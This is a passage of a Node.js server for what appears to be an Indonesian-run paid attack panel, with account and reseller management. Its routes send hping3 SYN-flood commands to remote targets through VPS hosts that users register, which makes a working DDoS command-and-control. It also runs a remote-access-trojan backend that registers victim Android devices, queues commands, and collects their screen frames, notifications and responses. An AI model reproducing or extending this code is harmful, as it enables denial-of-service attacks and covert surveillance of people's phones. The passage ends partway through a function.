  const { id } = req.params;
  const privateChats = loadPrivateChat();

  for (const key in privateChats) {
    const msgIndex = privateChats[key].findIndex(m => m.id === id);
    if (msgIndex !== -1) {
      const msg = privateChats[key][msgIndex];
      if (msg.sender === req.user.username || req.user.role === 'owner') {
        privateChats[key].splice(msgIndex, 1);
        savePrivateChat(privateChats);
        return res.json({ valid: true });
      }
      break;
    }
  }

  res.json({ valid: false, error: 'Message not found or not authorized' });
});

app.get('/chat/private/unread-count', authenticateChat, (req, res) => {
  const privateChats = loadPrivateChat();
  let unread = 0;

  for (const [key, messages] of Object.entries(privateChats)) {
    if (key.endsWith(`_${req.user.username}`)) {
      unread += messages.filter(m => !m.read).length;
    }
  }

  res.json({ valid: true, unread });
});

app.post('/chat/private/mark-read/:withUser', authenticateChat, (req, res) => {
  const { withUser } = req.params;
  const privateChats = loadPrivateChat();
  const chatKey = `${withUser}_${req.user.username}`;

  if (privateChats[chatKey]) {
    privateChats[chatKey] = privateChats[chatKey].map(m => ({ ...m, read: true }));
    savePrivateChat(privateChats);
  }

  res.json({ valid: true });
});

app.get('/chat/search-users', authenticateChat, (req, res) => {
  const { q } = req.query;
  if (!q || q.length < 2) return res.json({ valid: true, users: [] });

  const db = loadDatabase();
  const profiles = loadUserProfiles();
  const users = db
    .filter(u => u.username.toLowerCase().includes(q.toLowerCase()) && u.username !== req.user.username)
    .slice(0, 20)
    .map(u => ({
      username: u.username,
      profile: profiles[u.username] || { username: u.username, name: u.username, avatar: null },
      role: u.role
    }));

  res.json({ valid: true, users });
});

// ============================================
// ROUTES: AUTH
// ============================================
app.post("/validate", (req, res) => {
  const { username, password, version, androidId } = req.body;

  if (!androidId) {
    return res.json({ valid: false, message: "androidId required" });
  }

  const db = loadDatabase();
  const userIdx = db.findIndex(u => u.username === username && u.password === password);
  const user = db[userIdx];

  if (!user) return res.json({ valid: false });

  if (!user.pairId) {
    user.pairId = genPairId();
    db[userIdx] = user;
    saveDatabase(db);
  }

  if (isExpired(user)) {
    return res.json({ valid: true, expired: true });
  }

  const key = generateKey();
  activeKeys[key] = {
    username,
    created: Date.now(),
    expires: Date.now() + 10 * 60 * 1000,
  };

  recordKey({
    username,
    key,
    role: user.role || 'member',
    ip: req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip,
    androidId,
  });

  const ddosList = [
    { ddos_id: "udp", ddos_name: "UDP Flood" },
    { ddos_id: "tcp", ddos_name: "TCP SYN Flood" },
    { ddos_id: "http", ddos_name: "HTTP Flood" },
    { ddos_id: "icmp", ddos_name: "ICMP Flood" },
  ];

  const payloadList = [
    { payload_id: "standard", payload_name: "Standard" },
    { payload_id: "amplified", payload_name: "Amplified" },
  ];

  return res.json({
    valid: true,
    expired: false,
    key,
    expiredDate: user.expiredDate,
    role: user.role || "member",
    pairId: user.pairId || null,
    listBug: bugs,
    listDDoS: ddosList,
    listPayload: payloadList,
    news
  });
});

app.get("/myInfo", (req, res) => {
  const { username, password, androidId, key } = req.query;
  console.log("[ℹ️ INFO] Fetching info for:", username);

  const db = loadDatabase();
  const user = db.find(u => u.username === username && u.password === password);
  const keyList = loadKeyList();
  const userKey = keyList.find(k => k.username === username);

  if (!userKey) {
    console.log("[❌ KEY] Invalid or missing session key.");
    return res.json({ valid: false, reason: "session" });
  }

  if (userKey.androidId !== androidId) {
    console.log("[⚠️ DEVICE] Device mismatch:", userKey.androidId, "!=", androidId);
    return res.json({ valid: false, reason: "device" });
  }

  if (!user) {
    console.log("[❌ INFO] User not found.");
    return res.json({ valid: false });
  }

  if (isExpired(user)) {
    console.log("[⚠️ INFO] User expired.");
    return res.json({ valid: true, expired: true });
  }

  recordKey({
    username,
    key,
    role: user.role || 'member',
    ip: req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip,
    androidId
  });

  console.log("[✅ INFO] Info dikirim untuk:", username);

  return res.json({
    valid: true,
    expired: false,
    key,
    username: user.username,
    password: "******",
    expiredDate: user.expiredDate,
    role: user.role || "member",
    pairId: user.pairId || null,
    listBug: bugs,
    news: news
  });
});

app.post("/changepass", (req, res) => {
  const { username, oldPass, newPass } = req.body;
  if (!username || !oldPass || !newPass) {
    return res.json({ success: false, message: "Incomplete data" });
  }

  const db = loadDatabase();
  const idx = db.findIndex(u => u.username === username && u.password === oldPass);
  if (idx === -1) {
    return res.json({ success: false, message: "Invalid credentials" });
  }

  db[idx].password = newPass;
  saveDatabase(db);

  return res.json({ success: true, message: "Password updated successfully" });
});

// ============================================
// ROUTES: USER MANAGEMENT
// ============================================
app.get("/createAccount", (req, res) => {
  const { key, newUser, pass, day } = req.query;
  console.log(`[👤 CREATE] Request create user '${newUser}' dengan key '${key}'`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    console.log("[❌ CREATE] Key tidak valid.");
    return res.json({ valid: false, error: true, message: "Invalid key." });
  }

  const db = loadDatabase();
  const creator = db.find(u => u.username === keyInfo.username);

  if (!creator || !["reseller", "owner", "reseller1"].includes(creator.role)) {
    console.log(`[❌ CREATE] ${creator?.username || "Unknown"} tidak memiliki izin.`);
    return res.json({ valid: true, authorized: false, message: "Not authorized." });
  }

  if (creator.role === "reseller" && parseInt(day) > 30) {
    console.log("[❌ CREATE] Reseller tidak boleh membuat akun lebih dari 30 hari.");
    return res.json({ valid: true, created: false, invalidDay: true, message: "Reseller can only create accounts up to 30 days." });
  }

  if (db.find(u => u.username === newUser)) {
    console.log("[❌ CREATE] Username sudah digunakan.");
    return res.json({ valid: true, created: false, message: "Username already exists." });
  }

  const expired = new Date();
  expired.setDate(expired.getDate() + parseInt(day));

  const newAccount = {
    username: newUser,
    password: pass,
    expiredDate: expired.toISOString().split("T")[0],
    role: "member",
    pairId: genPairId(),
  };

  db.push(newAccount);
  saveDatabase(db);

  console.log("[✅ CREATE] Akun berhasil dibuat:", newAccount);
  const logLine = `${creator.username} Created ${newUser} duration ${day}\n`;
  fs.appendFileSync('logUser.txt', logLine);

  return res.json({ valid: true, created: true, user: newAccount });
});

app.get("/deleteUser", (req, res) => {
  const { key, username } = req.query;
  console.log(`[🗑️ DELETE] Request hapus user '${username}' oleh key '${key}'`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    console.log("[❌ DELETE] Key tidak valid.");
    return res.json({ valid: false, error: true, message: "Invalid key." });
  }

  const db = loadDatabase();
  const admin = db.find(u => u.username === keyInfo.username);

  if (!admin || admin.role !== "owner") {
    console.log(`[❌ DELETE] ${admin?.username || "Unknown"} bukan owner.`);
    return res.json({ valid: true, authorized: false, message: "Only owner can delete users." });
  }

  const index = db.findIndex(u => u.username === username);
  if (index === -1) {
    console.log("[❌ DELETE] User tidak ditemukan.");
    return res.json({ valid: true, deleted: false, message: "User not found." });
  }

  const deletedUser = db[index];
  db.splice(index, 1);
  saveDatabase(db);

  const logLine = `${admin.username} Deleted ${deletedUser}\n`;
  fs.appendFileSync('logUser.txt', logLine);

  console.log("[✅ DELETE] User berhasil dihapus:", deletedUser);
  return res.json({ valid: true, deleted: true, user: deletedUser });
});

app.get("/listUsers", (req, res) => {
  const { key } = req.query;
  console.log(`[📋 LIST] Request lihat semua user oleh key '${key}'`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    console.log("[❌ LIST] Key tidak valid.");
    return res.json({ valid: false, error: true, message: "Invalid key." });
  }

  const db = loadDatabase();
  const admin = db.find(u => u.username === keyInfo.username);

  if (!admin || admin.role !== "owner") {
    console.log(`[❌ LIST] ${admin?.username || "Unknown"} bukan owner.`);
    return res.json({ valid: true, authorized: false, message: "Only owner can view users." });
  }

  const users = db.map(u => ({
    username: u.username,
    expiredDate: u.expiredDate,
    role: u.role || "member",
  }));

  return res.json({ valid: true, authorized: true, users });
});

app.get("/userAdd", (req, res) => {
  const { key, username, password, role, day } = req.query;
  console.log(`[➕ USERADD] ${username} dengan role ${role} oleh key ${key}`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: "Invalid key." });

  const db = loadDatabase();
  const creator = db.find(u => u.username === keyInfo.username);

  if (!creator || (creator.role !== "owner" && creator.role !== "dev")) {
    console.log("[❌ USERADD] Tidak diizinkan.");
    return res.json({ valid: true, authorized: false, message: "Only owner can add user with role." });
  }

  if (db.find(u => u.username === username)) {
    console.log("[❌ USERADD] Username sudah ada.");
    return res.json({ valid: true, created: false, message: "Username already exists." });
  }

  const expired = new Date();
  expired.setDate(expired.getDate() + parseInt(day));

  const newUser = {
    username,
    password,
    role: role || "member",
    expiredDate: expired.toISOString().split("T")[0],
    pairId: genPairId(),
  };

  db.push(newUser);
  saveDatabase(db);

  const logLine = `${creator.username} Created ${newUser} Role ${role} Days ${day}\n`;
  fs.appendFileSync('logUser.txt', logLine);
  console.log("[✅ USERADD] User berhasil dibuat:", newUser);
  return res.json({ valid: true, authorized: true, created: true, user: newUser });
});

app.get("/editUser", (req, res) => {
  const { key, username, addDays } = req.query;
  console.log(`[🛠️ EDIT] Tambah masa aktif ${username} +${addDays} hari oleh key ${key}`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: "Invalid key." });

  const db = loadDatabase();
  const editor = db.find(u => u.username === keyInfo.username);

  if (!editor || !["reseller", "owner"].includes(editor.role)) {
    console.log("[❌ EDIT] Tidak diizinkan.");
    return res.json({ valid: true, authorized: false, message: "Only reseller or owner can edit user." });
  }

  if (editor.role === "reseller" && parseInt(addDays) > 30) {
    return res.json({ valid: true, authorized: false, message: "Reseller can only add up to 30 days." });
  }

  const targetUser = db.find(u => u.username === username);
  if (!targetUser) {
    console.log("[❌ EDIT] User tidak ditemukan.");
    return res.json({ valid: true, edited: false, message: "User not found." });
  }

  if (editor.role === "reseller" && targetUser.role !== "member") {
    console.log("[❌ EDIT] Reseller hanya bisa mengedit user dengan role 'member'.");
    return res.json({ valid: true, edited: false, message: "Reseller hanya bisa mengedit user dengan role 'member'." });
  }

  const currentDate = new Date(targetUser.expiredDate);
  currentDate.setDate(currentDate.getDate() + parseInt(addDays));
  targetUser.expiredDate = currentDate.toISOString().split("T")[0];

  saveDatabase(db);
  const logLine = `${editor.username} Edited ${targetUser} Add Days ${addDays}\n`;
  fs.appendFileSync('logUser.txt', logLine);
  console.log("[✅ EDIT] Masa aktif diperbarui:", targetUser);
  return res.json({ valid: true, authorized: true, edited: true, user: targetUser });
});

app.get("/getLog", (req, res) => {
  const { key } = req.query;

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: "Invalid key." });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);

  const canViewAll = user && (user.role === "owner" || user.role === "admin");

  try {
    let logs = [];
    if (fs.existsSync("logUser.txt")) {
      const logContent = fs.readFileSync("logUser.txt", "utf-8");
      const lines = logContent.split("\n").filter(l => l.trim() !== "");
      logs = lines.map((line, i) => {
        const parts = line.trim().split(/\s+/);
        const actor = parts[0] || "system";
        const action = parts[1] || "activity";
        const target = parts[2] || "";
        const detail = parts.slice(3).join(" ");
        return {
          id: i + 1,
          timestamp: new Date(Date.now() - (lines.length - i) * 60000).toISOString(),
          activity: action.toLowerCase(),
          actor,
          target,
          description: line.trim(),
          details: {
            target: target || null,
            actor: actor || null,
            info: detail || null
          }
        };
      }).reverse();
    }

    if (!canViewAll && user) {
      logs = logs.filter(l => l.actor === user.username || l.target === user.username);
    }

    return res.json({ valid: true, authorized: canViewAll, logs });
  } catch (err) {
    return res.json({ valid: true, authorized: false, logs: [], error: "Failed to read log file." });
  }
});

// ============================================
// ROUTES: WHATSAPP
// ============================================
app.get("/setSenderPublic", (req, res) => {
  const { key, session, public: makePublic } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false, error: "Invalid key" });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.status(401).json({ valid: false, error: "User not found" });

  if (makePublic === 'true') {
    publicSenderSet.add(session);
    savePublicSenders();
    return res.json({ valid: true, message: `${session} dijadikan public` });
  } else {
    if (user.role !== 'owner') {
      return res.status(403).json({ valid: false, error: "Hanya owner yang bisa remove public sender" });
    }
    publicSenderSet.delete(session);
    savePublicSenders();
    return res.json({ valid: true, message: `${session} dijadikan private` });
  }
});

app.get("/deleteSender", (req, res) => {
  const { key, session } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false });

  if (activeConnections[session]) {
    try { activeConnections[session].end(); } catch(e) {}
    delete activeConnections[session];
  }
  publicSenderSet.delete(session);
  savePublicSenders();
  return res.json({ valid: true, message: "Sender dihapus" });
});

app.get("/deletePublicSender", (req, res) => {
  const { key, session } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user || user.role !== 'owner') return res.status(403).json({ valid: false, error: "Only owner" });

  if (activeConnections[session]) {
    try { activeConnections[session].end(); } catch(e) {}
    delete activeConnections[session];
  }
  publicSenderSet.delete(session);
  savePublicSenders();
  return res.json({ valid: true, message: "Public sender dihapus" });
});

app.get("/mySender", (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ error: "Invalid session key" });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.status(401).json({ error: "User not found" });

  const conns = getActiveCredsInFolder(user.username);
  const privateConns = conns.map(c => ({
    sessionName: c.sessionName,
    number: c.sessionName,
    type: 'private',
    status: 'connected',
    isPublic: publicSenderSet.has(c.sessionName)
  }));
  return res.json({
    valid: true,
    connections: {
      private: privateConns,
      global: privateConns.filter(c => c.isPublic)
    }
  });
});

app.get("/getPublicSenders", (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false, error: "Invalid session key" });

  try {
    const publicList = [];
    for (const [sessionName, sock] of Object.entries(activeConnections)) {
      if (publicSenderSet.has(sessionName)) {
        publicList.push({
          sessionName,
          number: sessionName,
          type: 'public',
          status: 'connected',
          owner: 'owner'
        });
      }
    }
    return res.json({ valid: true, senders: publicList });
  } catch(e) {
    return res.json({ valid: true, senders: [] });
  }
});

app.get("/getPairing", async (req, res) => {
  const { key, number } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    console.log("[❌ BUG] Key tidak valid.");
    return res.json({ valid: false });
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.status(401).json({ error: "User not found" });

  if (!number) return res.status(400).json({ error: "Number is required" });

  try {
    const sessionDir = path.join('permenmd', user.username, number);

    if (!fs.existsSync(`permenmd/${user.username}`)) fs.mkdirSync(`permenmd/${user.username}`, { recursive: true });
    if (!fs.existsSync(sessionDir)) fs.mkdirSync(sessionDir, { recursive: true });

    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
    const { version } = await fetchLatestBaileysVersion();

    const sock = makeWASocket({
      keepAliveIntervalMs: 50000,
      logger: pino({ level: "silent" }),
      auth: state,
      syncFullHistory: true,
      markOnlineOnConnect: true,
      connectTimeoutMs: 60000,
      defaultQueryTimeoutMs: 0,
      generateHighQualityLinkPreview: true,
      browser: ["Ubuntu", "Chrome", "20.0.04"],
      version
    });

    sock.ev.on("creds.update", saveCreds);

    sock.ev.on("connection.update", async (update) => {
      const { connection, lastDisconnect } = update;

      if (connection === "close") {
        const isLoggedOut = lastDisconnect?.error?.output?.statusCode === DisconnectReason.loggedOut;
        if (!isLoggedOut) {
          console.log(`🔄 Reconnecting ${number}...`);
          await waiting(3000);
          await pairingWa(number, user.username);
        } else {
          delete activeConnections[number];
        }
      }
    });

    if (!sock.authState.creds.registered) {
      await waiting(1000);
      let code = await sock.requestPairingCode(number);
      console.log(code);
      if (code) {
        return res.json({ valid: true, number, pairingCode: code });
      } else {
        return res.json({ valid: false, message: "Already registered or failed to get code" });
      }
    }
  } catch (err) {
    return res.status(500).json({ error: err.message });
  }
});

// ============================================
// ROUTES: VPS
// ============================================
app.get("/myServer", (req, res) => {
  const key = req.query.key;
  const username = getUserByKey(key);
  if (!username) return res.status(401).json({ valid: false, error: "Invalid session key" });

  const userVPS = vpsList.filter(vps => vps.owner === username);
  res.json({ valid: true, servers: userVPS });
});

app.post("/addServer", (req, res) => {
  const { key, host, username: sshUser, password } = req.body;
  const owner = getUserByKey(key);
  if (!owner) return res.status(401).json({ error: "Invalid session key" });

  if (!host || !sshUser || !password) return res.status(400).json({ error: "Missing fields" });

  const newVPS = { host, username: sshUser, password, owner };
  vpsList.push(newVPS);
  fs.writeFileSync(VPS_FILE, JSON.stringify(vpsList, null, 2));
  res.json({ success: true, message: "VPS added" });
});

app.post("/delServer", (req, res) => {
  const { key, host } = req.body;
  const owner = getUserByKey(key);
  if (!owner) return res.status(401).json({ error: "Invalid session key" });

  const before = vpsList.length;
  vpsList = vpsList.filter(vps => !(vps.host === host && vps.owner === owner));
  fs.writeFileSync(VPS_FILE, JSON.stringify(vpsList, null, 2));

  const deleted = before !== vpsList.length;
  res.json({ success: deleted, message: deleted ? "VPS deleted" : "VPS not found" });
});

app.post("/sendCommand", (req, res) => {
  const { key, target, port, duration } = req.body;
  const owner = getUserByKey(key);
  if (!owner) return res.status(401).json({ error: "Invalid session key" });

  if (!target || !port || !duration) return res.status(400).json({ error: "Missing fields" });

  const userVPS = vpsList.filter(vps => vps.owner === owner);
  if (userVPS.length === 0) return res.status(400).json({ error: "No VPS available for this user" });

  for (const vps of userVPS) {
    const conn = vpsConnections[vps.host];
    if (!conn) {
      console.log(`❌ Not connected to ${vps.host}`);
      continue;
    }

    const command = `screen -dmS hping3 -S --flood ${target} -p ${port}`;
    const killCmd = `sleep ${duration}; pkill screen`;

    conn.exec(`${command} && ${killCmd}`, (err, stream) => {
      if (err) return console.error(`❌ Exec error on ${vps.host}:`, err.message);
      stream.on('close', (code, signal) => {
        console.log(`✅ Command done on ${vps.host} (code: ${code})`);
      });
    });
  }

  res.json({ success: true, message: `Command sent to ${userVPS.length} VPS` });
});

app.get('/api/vps/cncSend', (req, res) => {
  const { key, target, ddos, port, duration } = req.query;
  const owner = getUserByKey(key);
  if (!owner) return res.status(401).json({ error: 'Invalid session key' });

  const userVPS = vpsList.filter(vps => vps.owner === owner);
  if (!userVPS.length) return res.status(400).json({ error: 'No VPS available' });

  for (const vps of userVPS) {
    const conn = vpsConnections[vps.host];
    if (!conn) continue;
    const cmd = `screen -dmS cnc_${Date.now()} hping3 -S --flood ${target} -p ${port || 80}`;
    const kill = `sleep ${duration || 60}; pkill screen`;
    conn.exec(`${cmd} && ${kill}`, (err, stream) => {
      if (err) console.error('❌ cncSend exec error:', err.message);
    });
  }
  res.json({ success: true, message: `CNC sent to ${userVPS.length} VPS` });
});

// ============================================
// ROUTES: DEVICE PERMS
// ============================================
app.get("/devicePerms", (req, res) => {
  const { key, username } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false });

  const perms = loadDevicePerms();
  const userPerm = perms[username?.toLowerCase()] || { approved: false, allDevices: false, devices: [] };

  const db = loadDatabase();
  const requester = db.find(u => u.username === keyInfo.username);
  if (requester?.role === 'owner' || keyInfo.username?.toLowerCase() === username?.toLowerCase()) {
    const isOwner = requester?.role === 'owner';
    if (isOwner && keyInfo.username === username) {
      return res.json({ valid: true, approved: true, allDevices: true, devices: [] });
    }
  }

  return res.json({ valid: true, ...userPerm });
});

app.post("/setDevicePerm", (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false, error: "Invalid session key" });

  const db = loadDatabase();
  const requester = db.find(u => u.username === keyInfo.username);
  if (!requester || requester.role !== 'owner') {
    return res.status(403).json({ valid: false, error: "Only owner can manage permissions" });
  }

  const { username, approved, allDevices, devices } = req.body;
  if (!username) return res.status(400).json({ valid: false, error: "Username required" });

  const perms = loadDevicePerms();
  perms[username.toLowerCase()] = {
    approved: approved === true || approved === 'true',
    allDevices: allDevices === true || allDevices === 'true',
    devices: Array.isArray(devices) ? devices : []
  };
  saveDevicePerms(perms);

  return res.json({ valid: true, message: "Permission updated" });
});

app.get("/listDevicePerms", (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false });
  const db = loadDatabase();
  const requester = db.find(u => u.username === keyInfo.username);
  if (!requester || requester.role !== 'owner') return res.status(403).json({ valid: false });
  const perms = loadDevicePerms();
  return res.json({ valid: true, perms });
});

// ============================================
// ROUTES: RAT
// ============================================
app.post('/api/register-target', (req, res) => {
  const d = req.body;
  let t = readRat(RAT_TARGETS);
  const i = t.findIndex(x => x.id === d.id);
  if (i !== -1) t[i] = { ...t[i], ...d, lastSeen: new Date() };
  else t.push({ ...d, lastSeen: new Date() });
  saveRat(RAT_TARGETS, t);
  res.json({ status: 'ok' });
});

app.post('/api/pair-target', (req, res) => {
  const { pairId, deviceId, model, battery } = req.body;
  if (!pairId || !deviceId) return res.status(400).json({ error: 'pairId dan deviceId wajib' });

  let db = loadDatabase();

  let dbChanged = false;
  for (let i = 0; i < db.length; i++) {
    if (!db[i].pairId) {
      db[i].pairId = genPairId();
      dbChanged = true;
      console.log('[AUTO-PAIR] Generated pairId for user: ' + db[i].username + ' → ' + db[i].pairId);
    }
  }
  if (dbChanged) saveDatabase(db);

  const ownerIdx = db.findIndex(u =>
    u.pairId && u.pairId.toUpperCase() === pairId.toUpperCase()
  );

  console.log('[PAIR-DEBUG] Looking for pairId: ' + pairId + ' | Found at index: ' + ownerIdx);
  if (ownerIdx >= 0) {
    console.log('[PAIR-DEBUG] Owner found: ' + db[ownerIdx].username + ' | Their pairId: ' + db[ownerIdx].pairId);
  } else {
    console.log('[PAIR-DEBUG] All pairIds in DB: ' + db.map(u => u.username + ':' + u.pairId).join(', '));
  }

  if (ownerIdx === -1) return res.status(404).json({ error: 'PairID tidak valid', hint: 'Cek pairId di Device Dashboard' });
  const owner = db[ownerIdx];
  if (!owner.devices) owner.devices = [];
  if (!owner.devices.includes(deviceId)) {
    owner.devices.push(deviceId);
    db[ownerIdx] = owner;
    saveDatabase(db);
  }
  let t = readRat(RAT_TARGETS);
  const i = t.findIndex(x => x.id === deviceId);
  const dev = { id: deviceId, model: model || 'Unknown', battery: battery || '?', owner: owner.username, status: 'Online', lastSeen: new Date() };
  if (i !== -1) t[i] = { ...t[i], ...dev };
  else t.push(dev);
  saveRat(RAT_TARGETS, t);
  console.log('[PAIR] ' + deviceId + ' → ' + owner.username);
  res.json({ status: 'paired', ownerUsername: owner.username });
});

app.post('/api/heartbeat/:id', (req, res) => {
  const id = req.params.id;
  let t = readRat(RAT_TARGETS);
  const i = t.findIndex(x => x.id === id);
  if (i !== -1) {
    t[i].lastSeen = new Date();
    t[i].status = 'Online';
    if (req.body.battery) t[i].battery = req.body.battery;
    saveRat(RAT_TARGETS, t);
  }
  res.status(200).send('1');
});

app.post('/api/send-command', (req, res) => {
  const { id, command, extra } = req.body;
  if (!id || !command) {
    return res.status(400).json({ error: 'id dan command wajib' });
  }

  let cmds = readRat('./rat_commands.json');
  cmds = cmds.filter(c => c.targetId !== id);
  cmds.push({ targetId: id, command, extra: extra || '', timestamp: new Date() });
  saveRat('./rat_commands.json', cmds);
  console.log('[CMD] ' + id + ': ' + command + (extra ? ' | extra: ' + extra : ''));
  res.json({ status: 'queued' });
});

app.get('/api/get-command/:id', (req, res) => {
  const id = req.params.id;
  let cmds = readRat('./rat_commands.json');
  const i = cmds.findIndex(c => c.targetId === id);
  if (i !== -1) {
    const cmd = cmds[i];
    cmds.splice(i, 1);
    saveRat('./rat_commands.json', cmds);
    return res.json(cmd);
  }
  res.status(204).send();
});

app.post('/api/post-response/:id', (req, res) => {
  const id = req.params.id;
  const { cmd, data } = req.body;
  let resps = readRat('./rat_responses.json');
  const i = resps.findIndex(r => r.targetId === id);
  const nr = { targetId: id, cmd, data, timestamp: new Date() };
  if (i !== -1) resps[i] = nr; else resps.push(nr);
  saveRat('./rat_responses.json', resps);
  console.log('[RESP] ' + cmd + ' from ' + id);
  res.json({ status: 'ok' });
});

app.get('/api/get-response/:id', (req, res) => {
  const resps = readRat('./rat_responses.json');
  const found = resps.find(r => r.targetId === req.params.id);
  if (found) {
    return res.json(found);
  }
  res.status(204).send();
});

app.post('/api/live-frame/:id', (req, res) => {
  const { frame, ts } = req.body;
  if (!frame) return res.status(400).json({ error: 'no frame' });
  RAT_LIVE[req.params.id] = { frame, ts: ts || Date.now() };
  res.json({ status: 'ok' });
});

app.get('/api/live-frame/:id', (req, res) => {
  const d = RAT_LIVE[req.params.id];
  if (!d) return res.status(404).json({ error: 'no frame yet' });
  res.json(d);
});

app.post('/api/post-notification/:id', (req, res) => {
  let n = readRat('./rat_notifs.json');
  n.unshift({ targetId: req.params.id, ...req.body, timestamp: new Date() });
  if (n.length > 1000) n = n.slice(0, 1000);
  saveRat('./rat_notifs.json', n);
  res.json({ status: 'saved' });
});

app.get('/api/get-notifications/:id', (req, res) => {
  const n = readRat('./rat_notifs.json');
  res.json(n.filter(x => x.targetId === req.params.id));
});

const lockChats = {};

app.post('/api/lock-chat/:id', (req, res) => {
  const { id } = req.params;
  const { text, from } = req.body;
  if (!text) return res.status(400).json({ error: 'text required' });
  if (!lockChats[id]) lockChats[id] = [];
  const msg = { from: from || 'owner', text, time: new Date().toISOString().substring(11, 16) };
  lockChats[id].push(msg);
  if (lockChats[id].length > 200) lockChats[id] = lockChats[id].slice(-200);
  console.log(`[CHAT] ${from||'owner'} → ${id}: ${text}`);
  res.json({ status: 'sent' });
});

app.get('/api/lock-chat/:id', (req, res) => {
  const { id } = req.params;
  res.json({ messages: lockChats[id] || [] });
});

app.get('/api/lock-chat-all/:id', (req, res) => {
  const { id } = req.params;
  res.json({ messages: lockChats[id] || [] });
});

app.delete('/api/lock-chat/:id', (req, res) => {
  const { id } = req.params;
  lockChats[id] = [];
  res.json({ status: 'cleared' });
});

app.get('/api/list-targets', (req, res) => {
  const { owner } = req.query;
  const t = readRat(RAT_TARGETS);
  res.json(owner ? t.filter(x => x.owner === owner) : t);
});

app.get('/admin/listpairids', (req, res) => {
  const { superkey } = req.query;
  if (superkey !== 'CRPT-SUPER-2025') return res.status(403).json({ error: 'Forbidden' });
  const db = loadDatabase();
  const list = db.map(u => ({ username: u.username, role: u.role, pairId: u.pairId || 'NONE' }));
  res.json(list);
});

app.get('/admin/genpairid', (req, res) => {
  const { superkey, username } = req.query;
  if (superkey !== 'CRPT-SUPER-2025') return res.status(403).json({ error: 'Forbidden' });
  const db = loadDatabase();
  const idx = db.findIndex(u => u.username === username);
  if (idx === -1) return res.json({ error: 'User not found' });
  db[idx].pairId = genPairId();
  saveDatabase(db);
  console.log(`[ADMIN] Force generated pairId for ${username}: ${db[idx].pairId}`);
  res.json({ username, pairId: db[idx].pairId });
});

app.get("/rat/pairid", (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: "Invalid key" });
  const db = loadDatabase();
  const idx = db.findIndex(u => u.username === keyInfo.username);
  if (idx === -1) return res.json({ valid: false, message: "User not found" });
  if (!db[idx].pairId) {
    db[idx].pairId = genPairId();
    saveDatabase(db);
    console.log('[PAIRID] Generated for: ' + db[idx].username + ' → ' + db[idx].pairId);
  }
  console.log('[PAIRID] Serving pairId for: ' + db[idx].username + ' → ' + db[idx].pairId);
  res.json({ valid: true, pairId: db[idx].pairId, username: db[idx].username, role: db[idx].role });
});

app.post("/rat/grant-member", (req, res) => {
  const { ownerKey, memberUsername, deviceIds, allDevices } = req.body;
  const keyInfo = activeKeys[ownerKey];
  if (!keyInfo) return res.status(401).json({ valid: false, message: "Invalid key" });
  const db = loadDatabase();
  const owner = db.find(u => u.username === keyInfo.username);
  if (!owner || owner.role !== "owner") return res.status(403).json({ valid: false, message: "Only owner can grant" });
  const member = db.find(u => u.username === memberUsername);
  if (!member) return res.status(404).json({ valid: false, message: "Member not found" });
  if (!member.ratPerms) member.ratPerms = {};
  member.ratPerms[owner.username] = {
    approved: true,
    allDevices: allDevices === true,
    deviceIds: Array.isArray(deviceIds) ? deviceIds : [],
  };
  saveDatabase(db);
  console.log(`[GRANT] ${owner.username} → ${memberUsername} | allDevices:${allDevices} | ids:${deviceIds}`);
  res.json({ valid: true, message: `${memberUsername} berhasil diberi akses` });
});

app.post("/rat/revoke-member", (req, res) => {
  const { ownerKey, memberUsername } = req.body;
  const keyInfo = activeKeys[ownerKey];
  if (!keyInfo) return res.status(401).json({ valid: false, message: "Invalid key" });
  const db = loadDatabase();
  const owner = db.find(u => u.username === keyInfo.username);
  if (!owner || owner.role !== "owner") return res.status(403).json({ valid: false, message: "Only owner" });
  const member = db.find(u => u.username === memberUsername);
  if (member && member.ratPerms) {
    delete member.ratPerms[owner.username];
    saveDatabase(db);
  }
  res.json({ valid: true, message: `Akses ${memberUsername} dicabut` });
});

app.get("/rat/my-devices", (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false });
  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.status(404).json({ valid: false });

  const targets = readRat(RAT_TARGETS);

  if (user.role === "owner" || user.role === "dev") {
    const owned = targets.filter(t => t.owner === user.username);
    return res.json({ valid: true, pairId: user.pairId, role: user.role, devices: owned });
  }

  const perms = loadDevicePerms();
  const userPerm = perms[user.username.toLowerCase()];

  let allowedDevices = [];

  if (userPerm && userPerm.approved) {
    if (userPerm.allDevices) {
      allowedDevices = targets;
    } else if (Array.isArray(userPerm.devices) && userPerm.devices.length > 0) {
